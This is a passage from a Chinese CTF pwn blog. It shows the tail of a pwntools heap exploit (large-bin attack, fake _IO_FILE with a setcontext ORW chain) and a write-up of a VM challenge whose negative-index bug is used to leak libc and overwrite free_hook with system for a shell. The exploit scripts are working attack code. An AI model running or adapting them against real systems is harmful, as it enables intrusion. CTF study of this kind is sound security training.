p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="comment">#p = process(challenge)</span></span><br><span class="line">    p = gdb.debug(challenge,cmd)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;xx.xx.xx.xx&#x27;</span>,<span class="string">&#x27;xx&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x15EF)\n&quot;</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,data=<span class="string">&quot;\x00&quot;</span></span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;size:\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&quot;content:\n&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,data</span>):</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&quot;idx:\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sa(<span class="string">&quot;content:\n&quot;</span>,data)   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;idx:\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;idx:\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x210</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x428</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x438</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x208</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x428</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x208</span>) <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x440</span>,<span class="number">0x428</span>*<span class="string">&#x27;a&#x27;</span>+p64(<span class="number">0xc91</span>)) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#3 0x2b0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#2 0xd20 - over \x00 to bk/fd</span></span><br><span class="line">add(<span class="number">0x428</span>) <span class="comment">#5 0x370</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>) <span class="comment"># 0x2b0 - bk=0xd20</span></span><br><span class="line">free(<span class="number">2</span>) <span class="comment"># 0xd20</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+<span class="string">&quot;\x00&quot;</span>) <span class="comment">#2 修复fd-&gt;bk(低位覆盖\x00)</span></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>) <span class="comment"># 0xd20</span></span><br><span class="line">free(<span class="number">5</span>) <span class="comment"># 0x350 - fd=0xd20</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x9f8</span>) <span class="comment">#3 make 0x350 to large </span></span><br><span class="line">add(<span class="number">0x428</span>,<span class="string">&#x27;\x00&#x27;</span>) <span class="comment">#5 修复bk-&gt;fd(低位覆盖\x00)</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>,<span class="number">0x200</span>*<span class="string">&#x27;a&#x27;</span>+p64(<span class="number">0xc90</span>))</span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x208</span>) <span class="comment">#8</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>) <span class="comment"># unlink</span></span><br><span class="line">add(<span class="number">0x430</span>,flat(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,p64(<span class="number">0x421</span>))) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x1600</span>) <span class="comment">#9</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;context:\n&quot;</span>)</span><br><span class="line">leak_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=leak_addr-<span class="number">0x21a310</span></span><br><span class="line">log.success(<span class="string">&#x27;leak_addr: &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">log.success(<span class="string">&#x27;libc_base: &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;context:\n&quot;</span>)</span><br><span class="line">leak_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">heap=leak_addr-<span class="number">0x290</span></span><br><span class="line">log.success(<span class="string">&#x27;leak_addr: &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">log.success(<span class="string">&#x27;heap_base: &#x27;</span>+<span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line">setcontext=libc_base+libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">61</span></span><br><span class="line">open_libc=libc_base+libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_libc=libc_base+libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_libc=libc_base+libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;setcontext &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(setcontext))</span><br><span class="line"></span><br><span class="line">IO_list_all = libc_base+<span class="number">0x21a680</span></span><br><span class="line">stderr = libc_base+libc.sym[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line">IO_wfile_jumps = libc_base+libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;IO_list_all &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(IO_list_all))</span><br><span class="line">success(<span class="string">&quot;IO_wfile_jumps &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(IO_wfile_jumps))</span><br><span class="line"></span><br><span class="line">pop_rdi_ret=<span class="number">0x000000000002a3e5</span>+libc_base</span><br><span class="line">pop_rsi_ret=<span class="number">0x000000000002be51</span>+libc_base</span><br><span class="line">pop_rdx_pop_rbx_ret=<span class="number">0x0000000000090529</span>+libc_base</span><br><span class="line">ret=<span class="number">0x0000000000029cd6</span>+libc_base</span><br><span class="line">success(<span class="string">&quot;pop_rdi_ret &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(pop_rdi_ret))</span><br><span class="line">success(<span class="string">&quot;pop_rsi_ret &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(pop_rsi_ret))</span><br><span class="line">success(<span class="string">&quot;pop_rdx_pop_rbx_ret &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(pop_rdx_pop_rbx_ret))</span><br><span class="line">success(<span class="string">&quot;ret &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(ret))</span><br><span class="line"></span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_io_addr = heap + <span class="number">0x1360</span> - <span class="number">0x10</span></span><br><span class="line">payload_addr = heap</span><br><span class="line">success(<span class="string">&quot;fake_io_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(fake_io_addr))</span><br><span class="line"></span><br><span class="line">ORW_addr = heap+<span class="number">0x8e0</span></span><br><span class="line">flag_addr = heap + <span class="number">0x8e0</span> + <span class="number">0x270</span></span><br><span class="line"></span><br><span class="line">fake_IO_FILE =  <span class="string">&quot;/bin/sh\x00&quot;</span>         <span class="comment">#_flags=rdi</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)+p64(<span class="number">2</span>) <span class="comment"># rcx!=0(FSOP)</span></span><br><span class="line">fake_IO_FILE += p64(ORW_addr-<span class="number">0xa0</span>)<span class="comment">#_IO_backup_base=rdx</span></span><br><span class="line">fake_IO_FILE += p64(setcontext)<span class="comment">#_IO_save_end=call addr(call setcontext/system)</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x58</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(flag_addr)  <span class="comment"># _lock = a writable address</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x30</span>)<span class="comment">#_wide_data,rax1_addr</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0xb0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>) <span class="comment">#mode=1</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0xc8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(IO_wfile_jumps+<span class="number">0x30</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x30</span>+<span class="number">0x10</span>)  <span class="comment"># rax2_addr</span></span><br><span class="line"></span><br><span class="line">chain  = p64(ORW_addr)</span><br><span class="line">chain += flat(pop_rdi_ret , flag_addr , pop_rsi_ret , <span class="number">0</span> , open_libc)</span><br><span class="line">chain +=flat(pop_rdi_ret , <span class="number">3</span> , pop_rsi_ret , flag_addr , pop_rdx_pop_rbx_ret , <span class="number">0x100</span> , <span class="number">0</span> , read_libc)</span><br><span class="line">chain +=flat(pop_rdi_ret , <span class="number">1</span> , pop_rsi_ret , flag_addr , pop_rdx_pop_rbx_ret , <span class="number">0x100</span> , <span class="number">0</span> , write_libc).ljust(<span class="number">0x200</span>,<span class="string">&#x27;\x00&#x27;</span>) + <span class="string">&#x27;./flag\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1240</span>,<span class="number">0x208</span>*<span class="string">&#x27;a&#x27;</span>+p64(<span class="number">0x431</span>)+<span class="number">0x428</span>*<span class="string">&#x27;a&#x27;</span>+p64(<span class="number">0x211</span>)+<span class="number">0x208</span>*<span class="string">&#x27;a&#x27;</span>+p64(<span class="number">0xa01</span>)) <span class="comment"># padding-不要破坏原来的chunk结构</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x440</span>,chain) <span class="comment"># 0-chain</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#11</span></span><br><span class="line">add(<span class="number">0x208</span>) <span class="comment">#12</span></span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1240</span>,<span class="number">0x208</span>*<span class="string">&#x27;a&#x27;</span>+p64(<span class="number">0x431</span>)+p64(libc_base+<span class="number">0x21a0d0</span>)*<span class="number">2</span>+p64(heap+<span class="number">0x1350</span>)+p64(IO_list_all-<span class="number">0x20</span>)) <span class="comment">#4</span></span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment"># largebin attack</span></span><br><span class="line">add(<span class="number">0x410</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x1240</span>,<span class="number">0x208</span>*<span class="string">&#x27;a&#x27;</span>+p64(<span class="number">0x431</span>)+p64(libc_base+<span class="number">0x21a0d0</span>)*<span class="number">2</span>+p64(heap+<span class="number">0x1350</span>)*<span class="number">2</span>) <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">payload = fake_IO_FILE+p64(flag_addr)</span><br><span class="line">add(<span class="number">0x420</span>,payload) <span class="comment">#13</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">cmd(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/10/VM%20pwn+%E8%B4%9F%E6%95%B0%E6%BA%A2%E5%87%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/06/10/VM%20pwn+%E8%B4%9F%E6%95%B0%E6%BA%A2%E5%87%BA/" class="post-title-link" itemprop="url">VM pwn+负数溢出</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-06-10 20:40:49 / Modified: 20:42:15" itemprop="dateCreated datePublished" datetime="2023-06-10T20:40:49+08:00">2023-06-10</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>5.4k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>5 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>OVM</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.23</span><span class="number">-0u</span>buntu11<span class="number">.3</span>)</span> stable release version 2.23, by Roland McGrath et al.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwn: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=<span class="number">96</span>a6052bb1c224343250eeddc82f0099893fa797, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，Full RELRO，NX，PIE</li>
</ul>
<p><strong>程序分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">write(<span class="number">1</span>, <span class="string">&quot;PC: &quot;</span>, <span class="number">4uLL</span>);</span><br><span class="line">_isoc99_scanf(<span class="string">&quot;%hd&quot;</span>, &amp;reg_pc);</span><br><span class="line">getchar();</span><br><span class="line">write(<span class="number">1</span>, <span class="string">&quot;SP: &quot;</span>, <span class="number">4uLL</span>);</span><br><span class="line">_isoc99_scanf(<span class="string">&quot;%hd&quot;</span>, &amp;reg_sp);</span><br><span class="line">getchar();</span><br><span class="line">reg[<span class="number">13</span>] = reg_sp;</span><br><span class="line">reg[<span class="number">15</span>] = reg_pc;</span><br><span class="line">write(<span class="number">1</span>, <span class="string">&quot;CODE SIZE: &quot;</span>, <span class="number">0xB</span>uLL);</span><br><span class="line">_isoc99_scanf(<span class="string">&quot;%hd&quot;</span>, &amp;size);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">if</span> ( reg_sp + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)size &gt; <span class="number">0x10000</span> || !size )</span><br><span class="line">&#123;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;EXCEPTION\n&quot;</span>, <span class="number">0xA</span>uLL);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">155</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>输入 PC 和 SP 的值</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">write(<span class="number">1</span>, <span class="string">&quot;CODE: &quot;</span>, <span class="number">6uLL</span>);</span><br><span class="line">running = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; size &gt; i; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;memory[reg_pc + i]);</span><br><span class="line">  <span class="keyword">if</span> ( (memory[i + reg_pc] &amp; <span class="number">0xFF000000</span>) == <span class="number">0xFF000000</span> )</span><br><span class="line">    memory[i + reg_pc] = <span class="number">0xE0000000</span>;</span><br><span class="line">  getchar();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>输入该虚拟机的字节码</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( running )</span><br><span class="line">&#123;</span><br><span class="line">  op_code = fetch();</span><br><span class="line">  execute(op_code);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>然后在 execute 中执行字节码</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>命令 READ 和 WRITE 有负数溢出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x40</span>u:</span><br><span class="line">  op = (<span class="keyword">ssize_t</span>)memory;                   <span class="comment">// WRITE</span></span><br><span class="line">  memory[reg[num3]] = reg[num1];</span><br><span class="line">  <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( HIBYTE(op_code) == <span class="number">0x30</span> )</span><br><span class="line">&#123;</span><br><span class="line">  op = (<span class="keyword">ssize_t</span>)reg;                          <span class="comment">// READ</span></span><br><span class="line">  reg[num1] = memory[reg[num3]];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>虽然 opcode 的3个操作数 num1，num2，num3 都是无符号的，但是 memory 和 reg 本身存放的是有符号数据</li>
<li>于是 reg[numx] 就可能有负数溢出漏洞</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>使用 WRITE，READ 和一些辅助命令相互配合，可以泄露 memory 上方的 GOT 表</p>
<p>泄露脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">sla(<span class="string">&quot;PC: &quot;</span>,<span class="built_in">str</span>(<span class="number">0x100</span>))</span><br><span class="line">sla(<span class="string">&quot;SP: &quot;</span>,<span class="built_in">str</span>(<span class="number">0x100</span>))</span><br><span class="line">sla(<span class="string">&quot;CODE SIZE: &quot;</span>,<span class="built_in">str</span>(<span class="number">7</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;CODE: &quot;</span>)</span><br><span class="line"></span><br><span class="line">mov(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">mov(<span class="number">1</span>,<span class="number">62</span>)</span><br><span class="line">sub(<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">read(<span class="number">8</span>,<span class="number">2</span>)</span><br><span class="line">sub(<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line">read(<span class="number">9</span>,<span class="number">2</span>)</span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;R8: &quot;</span>)</span><br><span class="line">leak_addr1 = <span class="built_in">eval</span>(<span class="string">&quot;0x&quot;</span>+p.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">p.recvuntil(<span class="string">&quot;R9: &quot;</span>)</span><br><span class="line">leak_addr2 = <span class="built_in">eval</span>(<span class="string">&quot;0x&quot;</span>+p.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">leak_addr = leak_addr1 *<span class="number">0x100000000</span> + leak_addr2</span><br><span class="line">libc_base = leak_addr - libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free = libc_base + libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;system &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">success(<span class="string">&quot;free &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(free))</span><br></pre></td></tr></table></figure>
<p>由于 GOT 有 Full RELRO 保护，因此只能用 opcode 计算并劫持 free_hook-8 到全局指针 comment 上，然后通过程序提供的写入完成覆盖</p>
<p>这里可以选择通过 free + offset 的形式获取 free_hook-8</p>
<p>最后写入 bin/sh\x00 + system 就可以 get shell</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./pwn1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span 